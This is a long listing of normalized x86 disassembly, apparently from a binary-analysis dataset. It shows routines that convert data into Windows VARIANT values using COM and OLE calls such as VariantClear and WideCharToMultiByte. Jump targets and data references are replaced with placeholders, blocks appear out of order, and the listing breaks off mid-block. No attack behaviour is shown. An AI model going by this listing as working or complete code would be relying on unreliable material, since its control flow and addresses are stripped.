push eax
call ebx
push [ ebp + 0xc ]
mov ecx esi
call sub_42b2e5
mov esi eax
lea edi [ ebp - 0x38 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
fild [ ebp - 0x35 ]
mov al [ ebp - 0x37 ]
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_42a883
test al al
je r-xdata
dec eax
je r-xdata
call sub_442148
push eax
lea ecx [ ebp - 0x44 ]
call sub_4421b6
mov eax [ eax ]
push 0x8
push eax
lea ecx [ ebp - 0x120 ]
mov [ ebp - 0x4 ] 0x2
call sub_42665b
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x3
call sub_426779
lea eax [ ebp - 0x120 ]
push eax
call ebx
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x44 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_42a883
test al al
je r-xdata
cmp eax 0xc
je r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp - 0x36 ] 0x0
jne r-xdata
fld st0
fmul [ r--data ]
fstp st1
jmp r-xdata
push [ ebp + 0xc ]
mov ecx esi
call sub_42b2e5
mov esi eax
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
fldz
fstp [ ebp - 0x34 ]
movsw [ edi ] [ esi ]
movzx eax [ ebp - 0x20 ]
movzx ecx [ ebp - 0x22 ]
movsx edx [ ebp - 0x24 ]
xor esi esi
push esi
push esi
push esi
push eax
push ecx
push edx
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x2c ] esi
call sub_42693d
fld [ ebp - 0x34 ]
mov [ ebp - 0x74 ] 0x7
fstp [ ebp - 0x6c ]
lea eax [ ebp - 0x74 ]
lea ecx [ ebp - 0x1c ]
push eax
mov [ ebp - 0x4 ] 0xf
call sub_426779
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x74 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_42a883
test al al
je r-xdata
dec eax
jne r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_42a883
test al al
je r-xdata
cmp eax 0xf
jle r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_42a883
test al al
je r-xdata
dec eax
je r-xdata
fstp [ ebp - 0x7c ]
mov [ ebp - 0x84 ] 0x5
lea eax [ ebp - 0x84 ]
lea ecx [ ebp - 0x1c ]
push eax
mov [ ebp - 0x4 ] 0xe
call sub_426779
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x84 ]
jmp r-xdata
fld st0
fchs
fstp st1
mov cl al
dec al
test cl cl
jbe r-xdata
push eax
call ebx
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea edi [ ebp - 0x24 ]
and [ ebp - 0x2c ] 0x0
lea eax [ eax + eax * 2 ]
shl eax 0x4
fldz
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
fstp [ ebp - 0x34 ]
mov esi eax
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movzx eax [ ebp - 0x20 ]
movzx ecx [ ebp - 0x22 ]
movzx edx [ ebp - 0x24 ]
push eax
push ecx
push edx
push 0x1e
push 0xc
push 0x76b
lea ecx [ ebp - 0x34 ]
call sub_42693d
fld [ ebp - 0x34 ]
mov [ ebp - 0xa4 ] 0x7
fstp [ ebp - 0x9c ]
lea eax [ ebp - 0xa4 ]
lea ecx [ ebp - 0x1c ]
push eax
mov [ ebp - 0x4 ] 0x10
call sub_426779
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0xa4 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_42a883
test al al
je r-xdata
mov ax [ eax ]
push 0xb
push eax
lea ecx [ ebp - 0x100 ]
call sub_4266d6
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0xb
call sub_426779
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x100 ]
jmp r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
cmp eax 0x11
jle r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_42a883
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea edi [ ebp - 0x38 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
mov esi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movzx eax [ ebp - 0x2e ]
movzx ecx [ ebp - 0x30 ]
movzx edx [ ebp - 0x32 ]
movzx esi [ ebp - 0x34 ]
movsx edi [ ebp - 0x38 ]
push eax
push ecx
movzx eax [ ebp - 0x36 ]
push edx
push esi
push eax
push edi
lea ecx [ ebp - 0xe0 ]
call sub_42693d
fld [ ebp - 0xe0 ]
mov [ ebp - 0xd4 ] 0x7
fstp [ ebp - 0xcc ]
lea eax [ ebp - 0xd4 ]
lea ecx [ ebp - 0x1c ]
push eax
mov [ ebp - 0x4 ] 0x11
call sub_426779
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0xd4 ]
push eax
lea ecx [ ebp - 0x130 ]
call sub_42663b
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x1
call sub_426779
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x130 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_42a883
test al al
je r-xdata
cmp eax 0x12
je r-xdata
mov ax [ eax ]
push 0x2
push eax
lea ecx [ ebp - 0x110 ]
call sub_4266d6
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x7
call sub_426779
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x110 ]
jmp r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_42a883
test al al
je r-xdata
dec eax
je r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
cmp eax 0x13
jne r-xdata
push 0x3
lea ecx [ ebp - 0xf0 ]
push [ eax ]
call sub_42670c
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x8
call sub_426779
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0xf0 ]
jmp r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_42a883
test al al
je r-xdata
dec eax
je r-xdata
mov al [ eax ]
mov [ ebp - 0xb4 ] 0x11
mov [ ebp - 0xac ] al
lea eax [ ebp - 0xb4 ]
lea ecx [ ebp - 0x1c ]
push eax
mov [ ebp - 0x4 ] 0x6
call sub_426779
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0xb4 ]
jmp r-xdata
fld [ eax ]
mov [ ebp - 0x64 ] 0x4
fstp [ ebp - 0x5c ]
lea eax [ ebp - 0x64 ]
lea ecx [ ebp - 0x1c ]
push eax
mov [ ebp - 0x4 ] 0x9
call sub_426779
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x64 ]
jmp r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_42a883
test al al
je r-xdata
dec eax
jne r-xdata
fld [ eax ]
mov [ ebp - 0x94 ] 0x5
fstp [ ebp - 0x8c ]
lea eax [ ebp - 0x94 ]
lea ecx [ ebp - 0x1c ]
push eax
mov [ ebp - 0x4 ] 0xa
call sub_426779
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x94 ]
jmp r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ ecx + eax + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_42a883
test al al
je r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x54 ] 0x6
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x54 ]
lea ecx [ ebp - 0x1c ]
push eax
mov [ ebp - 0x4 ] 0xd
call sub_426779
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x54 ]
jmp r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
fld [ eax ]
mov [ ebp - 0xc4 ] 0x7
fstp [ ebp - 0xbc ]
lea eax [ ebp - 0xc4 ]
lea ecx [ ebp - 0x1c ]
push eax
mov [ ebp - 0x4 ] 0xc
call sub_426779
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0xc4 ]
jmp r-xdata
sub_42b2a1
lea eax [ esp + 0x4 ]
push esi
mov esi ecx
push eax
call sub_42a883
test al al
je r-xdata
xor al al
mov eax [ esp + 0x8 ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
add eax ecx
mov ecx [ eax + 0x10 ]
mov eax [ eax + 0x4 ]
mov edx ecx
and edx 0x3
add eax edx
add eax [ esi + 0x8 ]
mov eax [ eax + ecx + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ ecx ] eax
mov al 0x1
jmp r-xdata
pop esi
retn 0x8
sub_42b2fc
mov eax sub_464844
call sub_42dc88
sub esp 0x6c
push edi
mov edi ecx
xor ecx ecx
cmp [ edi + 0x10 ] ecx
mov [ edi + 0x44 ] 0x1
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x18 ] ecx
jle r-xdata
mov ecx [ ebp - 0xc ]
and [ edi + 0x44 ] 0x0
xor eax eax
pop edi
mov [ fs : 0x0 ] ecx
leave
retn
push ebx
mov ebx [ VariantClear@IAT ]
push esi
inc ecx
cmp ecx [ edi + 0x10 ]
mov [ ebp - 0x18 ] ecx
jl r-xdata
mov ecx [ ebp - 0x10 ]
shl ecx 0x4
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov edx [ edi + 0x14 ]
lea eax [ ecx + ecx * 4 ]
mov eax [ edx + eax * 8 + 0x24 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop esi
pop ebx
mov ecx [ eax ]
mov esi [ eax + 0x8 ]
push 0x20
lea eax [ ebp - 0x78 ]
push 0x0
push eax
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x24 ] 0xfffffffd
call sub_42dc30
add esp 0xc
lea eax [ ebp - 0x38 ]
push eax
call sub_426793
and [ ebp - 0x4 ] 0x0
cmp [ edi + 0x48 ] 0x0
je r-xdata
mov eax [ edi + 0x40 ]
add eax [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx edi
inc eax
push eax
lea eax [ ebp - 0x58 ]
push eax
call sub_42ab25
push eax
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x4 ] 0x1
call sub_426779
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x58 ]
push eax
call ebx
lea eax [ ebp - 0x38 ]
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x38 ]
push eax
call ebx
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov ecx [ eax ]
lea edx [ ebp - 0x1c ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x24 ]
push 0x1
mov [ ebp - 0x44 ] eax
pop eax
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] eax
mov [ esi + 0xa0 ] eax
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x1c ]
push edx
lea edx [ ebp - 0x78 ]
push edx
lea edx [ ebp - 0x48 ]
mov ecx [ eax ]
push 0x0
push edx
push 0x4
push 0x0
push r--data
push [ esi + 0x94 ]
push eax
call [ ecx + 0x18 ]
mov eax [ ebp - 0x1c ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
and [ esi + 0xa0 ] 0x0
cmp [ ebp - 0x74 ] 0x0
je r-xdata
cmp [ ebp - 0x70 ] 0x0
je r-xdata
push [ ebp - 0x74 ]
call [ SysFreeString@IAT ]
cmp [ ebp - 0x6c ] 0x0
je r-xdata
push [ ebp - 0x70 ]
call [ SysFreeString@IAT ]
lea eax [ ebp - 0x38 ]
push eax
call ebx
inc [ ebp - 0x10 ]
add [ ebp - 0x14 ] 0x10
push [ ebp - 0x6c ]
call [ SysFreeString@IAT ]
sub_42b491
mov eax sub_46486b
call sub_42dc88
sub esp 0xb4
push ebx
push esi
push edi
mov ebx ecx
xor edi edi
cmp [ ebx + 0x48 ] edi
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x18 ] edi
je r-xdata
cmp [ ebx + 0xc ] edi
lea ecx [ ebx + 0xc ]
jne r-xdata
cmp [ ebx + 0x54 ] edi
je r-xdata
cmp [ ebx + 0x10 ] edi
mov [ ebp - 0x20 ] edi
jle r-xdata
mov eax [ ebx + 0x8 ]
push ecx
push r--data
push eax
mov edx [ eax ]
call [ edx ]
cmp eax edi
jl r-xdata
xor eax eax
push 0x1
pop esi
cmp [ ebx + 0x10 ] esi
mov [ ebp - 0x34 ] esi
jl r-xdata
mov eax [ ebx + 0x1c ]
cmp eax edi
mov [ ebp - 0x1c ] eax
je r-xdata
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x20 ] 0x30
mov [ ebp - 0x1c ] 0x28
cmp [ ebp - 0x18 ] edi
jle r-xdata
mov eax [ ebp - 0x1c ]
mov esi [ eax + 0x8 ]
mov ecx [ eax ]
mov [ ebp - 0x1c ] ecx
mov eax [ esi ]
mov eax [ eax + 0x4c ]
cmp eax edi
je r-xdata
inc [ ebp - 0x20 ]
add [ ebp - 0x34 ] 0x28
mov eax [ ebp - 0x20 ]
cmp eax [ ebx + 0x10 ]
jl r-xdata
mov edx [ ebp - 0x40 ]
lea edx [ edx + edx * 2 ]
shl edx 0x4
mov [ ebp - 0x1c ] edx
add [ ebp - 0x1c ] 0x28
add [ ebp - 0x20 ] 0x30
inc esi
cmp esi [ ebx + 0x10 ]
mov [ ebp - 0x34 ] esi
jle r-xdata
mov ecx eax
mov eax [ eax ]
mov [ ebp - 0x44 ] eax
mov ecx [ ecx + 0x8 ]
cmp [ ecx + 0xa4 ] edi
lea edx [ ecx + 0xa4 ]
je r-xdata
mov eax [ ebx + 0xc ]
push edi
push edi
push edi
mov ecx [ eax ]
push eax
call [ ecx + 0x1c ]
mov esi eax
mov [ ebx + 0x44 ] edi
cmp esi edi
jge r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
mov ecx [ eax ]
lea edx [ ebp - 0x10 ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ ebx + 0x14 ]
mov ecx [ ebp - 0x34 ]
mov eax [ ecx + eax + 0x24 ]
mov eax [ eax + 0x4 ]
cmp eax edi
je r-xdata
inc [ ebp - 0x40 ]
add edx 0x30
cmp eax edi
mov [ ebp - 0x1c ] edx
jne r-xdata
inc [ ebp - 0x18 ]
push 0x1
pop esi
mov [ ecx ] edi
cmp [ ebp - 0x18 ] esi
jne r-xdata
mov eax [ ebx + 0x14 ]
mov ecx [ ebp - 0x1c ]
mov eax [ ecx + eax - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ ebp - 0x18 ] edi
jle r-xdata
inc [ ebp - 0x40 ]
jmp r-xdata
inc [ ebp - 0x18 ]
push 0x1
pop eax
mov [ edx ] edi
cmp [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x10 ]
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x10 ]
push [ esi + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x10 ]
test eax eax
jne r-xdata
mov ecx eax
mov eax [ eax ]
mov [ ebp - 0x3c ] eax
mov ecx [ ecx + 0x8 ]
mov [ ebp - 0x10 ] ecx
add ecx 0xa4
cmp [ ecx ] edi
je r-xdata
push 0x10
lea eax [ ebp - 0x58 ]
pop esi
push eax
call sub_426793
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x2
lea ecx [ eax + 0xa8 ]
mov [ ebp - 0x48 ] ecx
movzx eax [ ecx ]
cmp eax edi
jl r-xdata
mov eax [ ebx + 0xc ]
lea edx [ ebp - 0x44 ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp eax edi
jl r-xdata
mov [ ebx + 0x44 ] edi
cmp eax edi
je r-xdata
lea eax [ ecx + 0xa8 ]
lea ecx [ ebp - 0x30 ]
push eax
mov [ ebp - 0x48 ] eax
call sub_42663b
mov [ ebp - 0x4 ] edi
mov [ ebp - 0xb0 ] edi
mov [ ebp - 0xac ] edi
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xa4 ] edi
mov [ ebp - 0x94 ] edi
mov [ ebp - 0x8c ] edi
mov [ ebp - 0xa0 ] edi
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] esi
call sub_42a883
test al al
je r-xdata
mov [ ebx + 0x44 ] eax
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc [ ebp - 0x18 ]
push 0x1
pop esi
cmp [ ebp - 0x18 ] esi
jne r-xdata
push ecx
lea ecx [ ebp - 0x58 ]
call sub_426779
cmp eax 0x1
jle r-xdata
cmp [ ebp - 0x44 ] esi
jne r-xdata
xor eax eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
jmp r-xdata
mov eax [ ebx + 0xc ]
lea edx [ ebp - 0x3c ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp eax edi
jl r-xdata
or esi 0xffffffff
cmp eax 0x8
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax [ ebx + 0xc ]
push esi
push eax
mov ecx [ eax ]
call [ ecx + 0xc ]
cmp eax edi
jl r-xdata
xor ecx ecx
mov eax [ ebp - 0x10 ]
lea ecx [ eax + eax * 2 ]
mov eax [ ebp - 0x14 ]
shl ecx 0x4
mov edx [ eax + 0x10 ]
mov ecx [ ecx + edx + 0x4 ]
add ecx [ eax + 0x8 ]
jmp r-xdata
mov ecx [ ebx + 0x54 ]
mov edx [ ebp - 0x20 ]
mov ecx [ ecx + 0x10 ]
push [ ecx + edx + 0x10 ]
lea ecx [ ebp - 0xb0 ]
push eax
push 0x1
call sub_42be42
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] esi
call sub_42a883
test al al
je r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xb0 ]
cmp [ eax ] di
jne r-xdata
cmp eax 0xa
je r-xdata
movzx eax [ ebp - 0x3c ]
mov ecx 0x81
cmp eax ecx
jg r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov ecx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov ax [ eax + ecx + 0x14 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebx + 0x54 ]
mov edx [ ebp - 0x20 ]
push edi
push edi
mov eax [ eax + 0x10 ]
push ecx
add eax edx
push [ eax + 0x10 ]
mov cx [ eax + 0x14 ]
push ecx
lea ecx [ ebp - 0xb0 ]
push [ eax + 0x8 ]
call sub_42beb9
mov eax [ ebx + 0x50 ]
lea ecx [ ebp - 0xb0 ]
push [ eax ]
call sub_42bf0d
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_42a883
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax [ ebx + 0xc ]
push esi
push eax
mov ecx [ eax ]
call [ ecx + 0xc ]
cmp eax edi
jl r-xdata
or esi 0xffffffff
jmp r-xdata
jmp r-xdata
sub eax 0x82
je r-xdata
je r-xdata
mov eax [ ebx + 0x3c ]
mov ecx [ ebp - 0x1c ]
add eax ecx
mov [ ebp - 0x80 ] edi
mov [ ebp - 0x7c ] 0x1
mov ecx [ eax + 0x2c ]
mov [ ebp - 0x70 ] esi
mov [ ebp - 0x78 ] ecx
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x6c ] ecx
mov ecx [ ebx + 0xc ]
lea esi [ ebp - 0x80 ]
mov [ ebp - 0x74 ] edi
mov edx [ ecx ]
push esi
push eax
push ecx
call [ edx + 0x10 ]
push [ ebp - 0x48 ]
mov esi [ VariantClear@IAT ]
call esi
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x58 ]
push eax
call esi
mov eax [ ebp - 0x3c ]
mov edx [ ebp - 0x1c ]
push edi
push 0x8
lea ecx [ ebp - 0x30 ]
call sub_42674e
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] esi
call sub_42a883
test al al
je r-xdata
sub eax 0x5
jne r-xdata
push edi
push 0x8
lea ecx [ ebp - 0x30 ]
call sub_42674e
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] esi
call sub_42a883
test al al
je r-xdata
cmp eax 0x8
jg r-xdata
xor eax eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
jmp r-xdata
mov eax [ ebx + 0x50 ]
lea ecx [ ebp - 0xb0 ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebx + 0x50 ]
call sub_42bdd4
mov ecx [ ebx + 0x50 ]
mov eax [ ebx + 0x54 ]
push [ ebp - 0x48 ]
mov [ ecx + 0x8 ] eax
call [ VariantClear@IAT ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0xb0 ]
call sub_42be2b
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x30 ]
push eax
call [ VariantClear@IAT ]
mov eax [ ebp - 0x44 ]
push edi
push 0x7
lea ecx [ ebp - 0x30 ]
call sub_42674e
push 0x10
lea eax [ ebp - 0x68 ]
push edi
push eax
call sub_42dc30
fld [ ebp - 0x28 ]
add esp 0xc
lea eax [ ebp - 0x58 ]
push eax
push ecx
push ecx
fstp [ esp ]
call [ VariantTimeToSystemTime@IAT ]
mov ax [ ebp - 0x58 ]
mov ecx 0xf4240
mov [ ebp - 0x68 ] ax
mov ax [ ebp - 0x56 ]
mov [ ebp - 0x66 ] ax
mov ax [ ebp - 0x52 ]
mov [ ebp - 0x64 ] ax
mov ax [ ebp - 0x50 ]
mov [ ebp - 0x62 ] ax
mov ax [ ebp - 0x4e ]
mov [ ebp - 0x60 ] ax
mov ax [ ebp - 0x4c ]
mov [ ebp - 0x5e ] ax
mov [ ebp - 0x10 ] esi
movzx eax [ ebp - 0x4a ]
cdq
idiv ecx
mov ecx [ ebx + 0x54 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x5c ] eax
lea eax [ ebp - 0x10 ]
push eax
call sub_42a883
test al al
je r-xdata
xor eax eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
jmp r-xdata
sub eax 0xb
je r-xdata
je r-xdata
mov ecx [ ebx + 0x54 ]
mov edx [ ebp - 0x20 ]
mov ecx [ ecx + 0x10 ]
push [ ecx + edx + 0x10 ]
push [ ebp - 0x28 ]
push eax
call sub_42fdfa
add esp 0xc
lea esi [ ebp - 0x68 ]
lea edi [ ebp - 0x78 ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl eax 0x4
movsd [ edi ] [ esi ]
mov eax [ eax + edx + 0x4 ]
lea esi [ ebp - 0x78 ]
add eax [ ecx + 0x8 ]
mov ecx [ ebx + 0x54 ]
mov edx [ ebp - 0x20 ]
push edi
push edi
mov ecx [ ecx + 0x10 ]
push [ ecx + edx + 0x10 ]
push eax
push 0xffffffff
push [ ebp - 0x28 ]
push edi
push edi
call [ WideCharToMultiByte@IAT ]
jmp r-xdata
push edi
push 0xb
lea ecx [ ebp - 0x30 ]
call sub_42674e
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_42a883
test al al
je r-xdata
sub eax 0x3
je r-xdata
dec eax
dec eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
jmp r-xdata
push edi
push 0xe
lea ecx [ ebp - 0x30 ]
call sub_42674e
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_42a883
test al al
je r-xdata
dec eax
dec eax
je r-xdata
push edi
push 0x2
lea ecx [ ebp - 0x30 ]
call sub_42674e
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_42a883
test al al
je r-xdata
dec eax
je r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
mov cx [ ebp - 0x28 ]
mov [ eax ] cx
jmp r-xdata
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0xc0 ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl eax 0x4
movsd [ edi ] [ esi ]
mov eax [ eax + edx + 0x4 ]
lea esi [ ebp - 0xc0 ]
add eax [ ecx + 0x8 ]
jmp r-xdata
push edi
push 0x10
lea ecx [ ebp - 0x30 ]
call sub_42674e
mov al [ ebp - 0x28 ]
mov ecx [ ebx + 0x54 ]
mov [ ebp - 0x35 ] al
lea eax [ ebp - 0x10 ]
